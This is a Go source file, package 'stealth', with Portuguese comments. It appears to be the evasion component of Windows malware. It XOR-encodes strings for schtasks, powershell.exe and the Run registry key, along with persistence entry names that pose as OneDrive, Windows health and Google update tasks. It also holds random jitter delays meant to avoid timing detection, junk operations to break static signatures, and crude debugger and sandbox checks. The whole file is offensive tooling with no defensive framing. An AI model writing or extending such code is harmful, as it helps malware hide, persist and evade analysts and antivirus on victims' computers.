package stealth

import (
	"crypto/rand"
	"encoding/base64"
	"time"
)

// XOR key para ofuscação de strings
var xorKey = []byte{0x4A, 0x7F, 0x2D, 0x9E, 0x51, 0xC3, 0x88, 0x1B}

// ObfuscateString ofusca uma string usando XOR
func ObfuscateString(input string) string {
	output := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		output[i] = input[i] ^ xorKey[i%len(xorKey)]
	}
	return base64.StdEncoding.EncodeToString(output)
}

// DeobfuscateString desofusca uma string XOR
func DeobfuscateString(input string) string {
	decoded, err := base64.StdEncoding.DecodeString(input)
	if err != nil {
		return ""
	}

	output := make([]byte, len(decoded))
	for i := 0; i < len(decoded); i++ {
		output[i] = decoded[i] ^ xorKey[i%len(xorKey)]
	}
	return string(output)
}

// Strings ofuscadas (geradas em tempo de build)
var (
	// "schtasks"
	obfStr_schtasks = "OhsSBgYNDg=="

	// "powershell.exe"
	obfStr_powershell = "HhkNBwwDDxQTSQIOCg=="

	// "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	obfStr_regRun = "Dg4bFAMKBAsMSQ8dGRgODxQMEBsOVAoCCggSDlIAJBULCgQVEw4ODhYLVwwBCg=="

	// "Global\\"
	obfStr_globalPrefix = "TxwLDAQLVg=="

	// Registry value names ofuscados
	obfStr_valueName1 = "Tw4HDgkGDxQvEBYGBxQ="        // OneDriveUpdate
	obfStr_valueName2 = "VwoCCggSDlwFBAsCEBwADhEDCw==" // WindowsHealthCheck
	obfStr_valueName3 = "TxwJDgMJSgQcFAsCAxQ="        // GoogleUpdateTask
)

// GetDeobfuscated retorna string desofuscada
func GetDeobfuscated(obfuscated string) string {
	return DeobfuscateString(obfuscated)
}

// SleepWithJitter dorme por um período com jitter aleatório
// Usado para evitar detecção por timing analysis
func SleepWithJitter(baseMs int64) {
	// Adicionar jitter de até 50%
	jitter := randomInt(baseMs / 2)
	totalMs := baseMs + jitter

	time.Sleep(time.Duration(totalMs) * time.Millisecond)
}

// RandomDelay adiciona delay aleatório entre operações
func RandomDelay() {
	// Delay entre 100ms e 2000ms
	delayMs := randomInt(1900) + 100
	time.Sleep(time.Duration(delayMs) * time.Millisecond)
}

// BreakSignature quebra assinatura estática adicionando operações inúteis
func BreakSignature() {
	// Operações matemáticas inúteis para confundir análise estática
	_ = randomInt(1000) * randomInt(1000)

	// Alocação e liberação de memória
	dummy := make([]byte, randomInt(1024)+512)
	for i := range dummy {
		dummy[i] = byte(randomInt(256))
	}

	// Sleep micro para alterar timing
	time.Sleep(time.Duration(randomInt(10)) * time.Microsecond)
}

// GenerateRandomBytes gera bytes aleatórios
func GenerateRandomBytes(n int) []byte {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		// Fallback para timestamp
		for i := range b {
			b[i] = byte(time.Now().UnixNano() % 256)
		}
	}
	return b
}

// IsDebuggerPresent detecta debugger (básico)
func IsDebuggerPresent() bool {
	// Verificação simples de timing
	start := time.Now()
	time.Sleep(10 * time.Millisecond)
	elapsed := time.Since(start)

	// Se demorou muito mais que 10ms, pode ter debugger
	if elapsed > 50*time.Millisecond {
		return true
	}

	return false
}

// CheckExecutionSpeed verifica se está rodando muito devagar (sandbox)
func CheckExecutionSpeed() bool {
	start := time.Now()

	// Operação que deveria ser rápida
	sum := 0
	for i := 0; i < 1000000; i++ {
		sum += i
	}

	elapsed := time.Since(start)

	// Se demorou mais de 1 segundo, pode ser sandbox
	return elapsed < 1*time.Second
}

// AntiEmulation adiciona código que emuladores têm dificuldade
func AntiEmulation() bool {
	// Múltiplas camadas de verificação
	checks := []bool{
		CheckExecutionSpeed(),
		!IsDebuggerPresent(),
		time.Now().Year() >= 2024, // Verificação de data
	}

	for _, check := range checks {
		if !check {
			return false
		}
	}

	return true
}
